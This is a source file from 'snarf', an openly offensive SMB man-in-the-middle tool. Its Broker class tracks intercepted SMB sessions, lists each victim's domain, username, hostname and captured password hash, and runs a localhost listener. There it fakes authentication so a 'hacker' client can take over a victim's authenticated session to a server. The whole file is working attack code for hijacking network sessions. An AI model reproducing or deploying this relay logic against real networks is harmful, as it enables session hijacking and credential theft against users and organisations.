//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2013 Josh Stone (yakovdk@gmail.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
// 
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// 
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------

var net = require("net");
var out = require("./out.js");
var smb = require("./smb.js");
var moment = require("moment");

//
// Don't use Broker by itself!  It should be subclassed
// and augmented in order to work right.  Basically, the
// idea is that this object maintains a list of available 
// Middler objects, each of which represent a channel
// that may be interacted with.
//
// The Broker can be specialized for particular protocols,
// such as with the SMBBroker() class defined below.  The
// general interface is as follows:
//
//    inTransition() 
//    Returns true if the MITM connection has not yet fully
//    authenticated.
//           
//    transit()
//    This function will manage the "fake" authentication needed
//    during the transitional period before handoff to the normal
//    "relay" code.
//
//    parsePacket()
//    This should take the data buffer received and convert it to the
//    necessary data structure.  It should have a "describe()"
//    function.
//
//    specialConditions() - 
//    Detect a special case during relayed communications.
// 
//    handleSpecials()
//    Take action when specialConditions() returns true.
//

module.exports.Broker = function() {
    this.middlers = [];
    this.current = undefined;
    this.hackercount = 0;
    this.socket = undefined;
    this.localactive = false;
    // var timerID;

    this.getMiddlers = function() {
	return this.middlers;
    }

    this.banner = function() {
    }

    this.setCurrentMiddler = function(n) {
	out.red("Changing middler to #"+n);
	this.current = this.middlers[n];
    }		

    this.getCurrentID = function() {
	return this.middlers.indexOf(this.current);
    }

    this.addMiddler = function(m) {
	this.middlers.push(m);
	if(this.middlers.length == 1) {
	    this.current = this.middlers[0];
	}
    }
    
    this.activateKeepAlive = function(middler) {
	return true;
    }

    this.deactivateKeepAlive = function(middler) {
	return true;
    }

    this.activateMiddler = function(m) {
	if(!this.localactive) {
	    this.listenForHackers();
	    this.localactive = true;
	}

        // Client connection has terminated, must maintain server connectivity.
        // out.yellow("Passing m.getSMBUserID() = " + m.attributes.userid);
        this.activateKeepAlive(m); // .getServer(), m.attributes.userid);
    }

    this.deactivateMiddler = function(m) {
	// If we don't stop pinging, then we'll get a delightful error
	// every five seconds that deletes a middler each time.  This
	// has the effect of eventually killing all of our sessions!

	//this.deactivateKeepAlive();
        this.deactivateKeepAlive(m); // this.middlers[m].getServer());
	out.red("Removing Middler #"+m);
	this.middlers[m].setActive(false);
    }

    this.resetIDs = function() {
	for(var i = 0; i < this.middlers.length; i++) {
	    this.middlers[i].setID(i);
	}
    }

    this.expire = function(i) {
	this.middlers[i].expire();
    }

    this.listMiddlers = function() {
	var ret = [];
	var currentID = this.getCurrentID();
	
	for(x=0; x<this.middlers.length; x++) {
	    var addr = this.middlers[x].getClientAddr();
	    var port = this.middlers[x].getClientPort();
	    var dest = this.middlers[x].getServerAddr();
	    var now  = moment();
	    ret.push({ id: x,
	    	       addr:   this.middlers[x].getClientAddr(),
	    	       port:   this.middlers[x].getClientPort(),
	    	       dest:   this.middlers[x].getServerAddr(),
                       domain: this.middlers[x].attributes.domain, // getDomain(),
	    	       user:   this.middlers[x].attributes.username, // getUsername(),
	    	       host:   this.middlers[x].attributes.hostname, // getHostname(),
                       winver: this.middlers[x].attributes.winver, //getWinVer(),
                       hash:   this.middlers[x].getHash(), // getHash(),
                       htype:  this.middlers[x].attributes.hashtype, //getHashType(),
	    	       age:    now.diff(this.middlers[x].getFreshness(), "seconds"),
	    	       active: this.middlers[x].getActive(),
	    	       current: x == currentID,
	    	       expired: this.middlers[x].expired
                     });
	}
	return ret;
    }

    this.checkout = function() {
	return this.current;
    }

    this.listenForHackers = function() {
	var myself = this;
	out.red("Ready to start listening for hackers");
	if(myself.socket == undefined) {
	    out.red("Listening for hacker clients on " + this.port());
	    var svr = net.createServer(function(sock) {
	    	myself.count = 0;
	    	myself.socket = sock;

	    	if(myself.banner(sock, myself.current)) {

                    currentMiddler = myself.middlers[myself.getCurrentID()];

	    	    // This may not always be true -- e.g., if
	    	    // something gets out of sync and the current
	    	    // middler is undefined.  We don't want the whole
	    	    // program to come crashing down, so we just
	    	    // gracefully ignore the inbound connection in
	    	    // such a case.  The hacker tool will see
	    	    // something like "NT_STATUS_CONNECTION_RESET"

	    	    if(currentMiddler) {
	    	    	myself.deactivateKeepAlive(currentMiddler); // currentMiddler.getServer());

	    	    	sock.on('end', function(x) {
	    	    	    myself.current.setClient(undefined);
	    	    	    myself.hackercount = 0;
                            out.yellow("Sending useid = " + currentMiddler.attributes.userid);
	    	    	    myself.activateKeepAlive(currentMiddler); // currentMiddler.getServer(), currentMiddler.attributes.userid);
	    	    	});

	    	    	sock.on('error', function(x) {
	    	    	    sock.end();
	    	    	});

	    	    	sock.on('data', function(x) {
	    	    	    var packet = myself.parsePacket(x);
	    	    	    out.green("Hacker: " + packet.describe());
	    	    	    var middler = myself.current;
	    	    	    middler.freshen();

	    	    	    if(myself.inTransition()) {
	    	    	    	var server  = middler.getServer();
	    	    	    	myself.transit(packet, sock, middler, server);
	    	    	    } else {
	    	    	    	
	    	    	    	// Once we have completed our authentication
	    	    	    	// handshake, the remainder of the session is to
	    	    	    	// pass packets back and forth.
                                
	    	    	    	myself.current.setClient(sock);
	    	    	    	myself.current.getReqPackets().push(packet);
	    	    	    	myself.current.getServer().write(x);
                                myself.current.setMature(true);
	    	    	    	
	    	    	    	if(myself.specialConditions(packet)) myself.handleSpecials(sock);
	    	    	    }
	    	    	    myself.count += 1;
	    	    	});
	    	    }
	    	}
	    }).listen(this.port(), "127.0.0.1");
	}
    }

}

